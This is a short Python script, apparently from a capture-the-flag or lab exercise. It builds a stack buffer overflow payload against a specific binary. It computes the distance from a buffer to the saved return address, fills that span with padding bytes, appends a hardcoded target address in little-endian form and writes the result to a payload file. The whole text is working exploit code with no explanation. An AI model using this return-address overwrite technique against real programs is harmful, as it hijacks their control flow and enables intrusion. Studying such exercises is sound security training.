ret_addr =  0xffffffffeb18
buf_addr = 0xffffffffea90
offset = ret_addr - buf_addr

target = 0x400930
buf_size = 128

payload = b"X" * offset + target.to_bytes(8, "little")
with open("files/payload.bin", "wb") as f:
    f.write(payload)